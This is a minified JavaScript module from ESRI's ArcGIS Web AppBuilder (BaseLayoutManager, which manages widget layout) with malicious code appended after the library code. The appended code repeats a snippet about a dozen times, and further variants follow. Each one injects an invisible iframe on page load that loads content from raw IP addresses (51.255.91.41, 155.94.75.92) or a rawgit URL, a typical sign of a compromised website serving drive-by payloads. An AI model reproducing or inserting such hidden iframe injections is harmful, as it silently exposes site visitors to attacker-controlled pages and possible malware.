// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dijit/_WidgetBase dojo/Deferred dojo/promise/all ../utils ../WidgetPlaceholder ../OnScreenWidgetIcon".split(" "),function(m,g,d,e,n,p,q,l,r,t){var h=null,f;f=m([n],{constructor:function(){this.widgetPlaceholders=[];this.onScreenWidgetIcons=[];this.invisibleWidgetIds=[]},name:"BaseLayoutManager",mapId:"map",map:null,layoutId:"jimu-layout-manager",postCreate:function(){this.containerNode=this.domNode;this.layoutId=jimuConfig.layoutId},
resize:function(){},isSupportEdit:function(){return!1},getMapDiv:function(){},setMap:function(a){this.map=a},onEnter:function(a,b){this.appConfig=a;this.mapId=b},onLeave:function(){},onThemeLoad:function(){},loadAndLayout:function(a){},openWidget:function(a){},onLayoutChange:function(a){},onWidgetChange:function(a,b){},onGroupChange:function(a,b){},onWidgetPoolChange:function(a,b){this.reloadControllerWidget(a,b.controllerId)},onActionTriggered:function(a){},onLayoutDefinitionChange:function(a,b){},
onOnScreenGroupsChange:function(a,b){},destroyOnScreenWidgetsAndGroups:function(a){},loadOnScreenWidgets:function(a){var b=[];d.forEach(a.widgetOnScreen.widgets,function(c){!1===c.visible?this.invisibleWidgetIds.push(c.id):b.push(this.loadOnScreenWidget(c,a))},this);return q(b)},loadOnScreenWidget:function(a,b){var c=new p;if("config"===b.mode&&!a.uri)return b=this._createOnScreenWidgetPlaceHolder(a),c.resolve(b),c;if(!a.uri)return c.resolve(null),c;a.inPanel||a.closeable?(b=this._createOnScreenWidgetIcon(a),
c.resolve(b)):this.widgetManager.loadWidget(a).then(g.hitch(this,function(b){try{b.setPosition(b.position),this.widgetManager.openWidget(b)}catch(k){console.log(console.error("fail to startup widget "+b.name+". "+k.stack))}b.configId=a.id;c.resolve(b)}),function(b){c.reject(b)});return c},onOnScreenWidgetChange:function(a,b){b=a.getConfigElementById(b.id);b.isController?this.reloadControllerWidget(a,b.id):(d.forEach(this.widgetPlaceholders,function(c){c.configId===b.id&&(c.destroy(),this.loadOnScreenWidget(b,
a))},this),this.removeDestroyed(this.widgetPlaceholders),this._updatePlaceholder(a),d.forEach(this.onScreenWidgetIcons,function(c){if(c.configId===b.id){var d=c.state;c.destroy();this.loadOnScreenWidget(b,a).then(function(a){if(b.uri&&"opened"===d)a.onClick()})}},this),this.removeDestroyed(this.onScreenWidgetIcons),d.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(c){c.configId===b.id&&(c.destroy(),!1===b.visible?0>this.invisibleWidgetIds.indexOf(b.id)&&this.invisibleWidgetIds.push(b.id):
this.loadOnScreenWidget(b,a))},this),d.forEach(this.invisibleWidgetIds,function(c){c===b.id&&!1!==b.visible&&(this.loadOnScreenWidget(b,a),c=this.invisibleWidgetIds.indexOf(b.id),this.invisibleWidgetIds.splice(c,1))},this),b.isOnScreen||d.forEach(this.widgetManager.getControllerWidgets(),function(c){c.widgetIsControlled(b.id)&&this.reloadControllerWidget(a,c.id)},this))},destroyOnScreenWidgetIcons:function(){d.forEach(this.onScreenWidgetIcons,function(a){a.destroy()},this);this.onScreenWidgetIcons=
[]},destroyOnScreenOffPanelWidgets:function(){d.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){this.widgetManager.destroyWidget(a)},this)},destroyWidgetPlaceholders:function(){d.forEach(this.widgetPlaceholders,function(a){a.destroy()},this);this.widgetPlaceholders=[]},removeDestroyed:function(a){var b=[];d.forEach(a,function(a){a._destroyed&&b.push(a)});d.forEach(b,function(b){b=a.indexOf(b);a.splice(b,1)})},_createOnScreenWidgetPlaceHolder:function(a){var b;b="map"===a.position.relativeTo?
this.mapId:this.layoutId;var c=g.clone(a);c.position.width=40;c.position.height=40;var d=l.getPositionStyle(c.position);a=new r({index:c.placeholderIndex,configId:a.id});e.setStyle(a.domNode,d);e.place(a.domNode,b);this.widgetPlaceholders.push(a);return a},_createOnScreenWidgetIcon:function(a){var b=new t({panelManager:this.panelManager,widgetManager:this.widgetManager,widgetConfig:a,configId:a.id,map:this.map});"map"===a.position.relativeTo?e.place(b.domNode,this.mapId):e.place(b.domNode,this.layoutId);
e.setStyle(b.domNode,l.getPositionStyle({top:a.position.top,left:a.position.left,right:a.position.right,bottom:a.position.bottom,width:40,height:40}));b.startup();!this.openAtStartWidget&&a.openAtStart&&(b.switchToOpen(),this.openAtStartWidget=a.name);this.onScreenWidgetIcons.push(b);return b},reloadControllerWidget:function(a,b){var c=this.widgetManager.getWidgetById(b);if(c){var d=c.getOpenedIds(),k=c.windowState;this._destroyControllerWidget(c);this._loadControllerWidget(a,b,d,k)}else this._loadControllerWidget(a,
b)},_destroyControllerWidget:function(a){d.forEach(a.getAllConfigs(),function(b){if(b.widgets)this.panelManager.destroyPanel(b.id+"_panel"),d.forEach(b.widgets,function(a){this.panelManager.destroyPanel(a.id+"_panel")},this);else{var a=this.widgetManager.getWidgetById(b.id);a&&(b.inPanel?this.panelManager.destroyPanel(a.getPanel()):this.widgetManager.destroyWidget(a))}},this);this.widgetManager.destroyWidget(a)},_loadControllerWidget:function(a,b,c,d){b=a.getConfigElementById(b);!1!==b.visible&&this.loadOnScreenWidget(b,
a).then(g.hitch(this,function(a){d&&this.widgetManager.changeWindowStateTo(a,d);c&&a.setOpenedIds(c)}))},_updatePlaceholder:function(a){d.forEach(this.widgetPlaceholders,function(b){b.setIndex(a.getConfigElementById(b.configId).placeholderIndex)},this)}});f.getInstance=function(){null===h&&(h=new f);return h};return f});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});